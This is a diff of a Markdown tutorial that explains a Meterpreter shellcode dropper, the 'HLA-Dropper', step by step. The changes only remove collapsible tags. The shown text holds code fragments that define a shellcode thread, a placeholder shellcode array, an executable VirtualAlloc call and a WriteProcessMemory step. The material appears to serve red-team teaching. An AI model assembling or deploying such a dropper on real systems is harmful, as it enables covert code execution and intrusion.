@@ -40,7 +40,6 @@ The technical functionality of the HLA-Dropper is relatively simple and therefor
 - WaitForSingleObject
 
 The code works like this. First, we need to define the thread function for shellcode execution later in the code.
-<details>
 ```
 // Define the thread function for executing shellcode
 // This function will be executed in a separate thread created later in the main function
@@ -55,26 +54,21 @@ DWORD WINAPI ExecuteShellcode(LPVOID lpParam) {
     return 0;
 }
 ```
-</details>
   
   
 Within the main function, the variable **code** is defined, which is responsible for storing the meterpreter shellcode. The content of "code" is stored in the .text (code) section of the PE structure or, if the shellcode is larger than 255 bytes, the shellcode is stored in the .rdata section.
-<details>
 ```
 // Insert the Meterpreter shellcode as an array of unsigned chars (replace the placeholder with actual shellcode)
     unsigned char code[] = "\xfc\x48\x83";
 ```
-</details> 
 
     
 The next code block defines the function pointer **void***, which points to the variable **exec** and stores the return address of the allocated memory using the Windows API VirtualAlloc.
-<details>
 ```
 // Allocate Virtual Memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode
     // 'exec' will hold the base address of the allocated memory region
     void* exec = VirtualAlloc(0, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 ```
-</details>    
     
 
 The meterpreter shellcode is then copied to the allocated memory using the Windows API **WriteProcessMemory**.
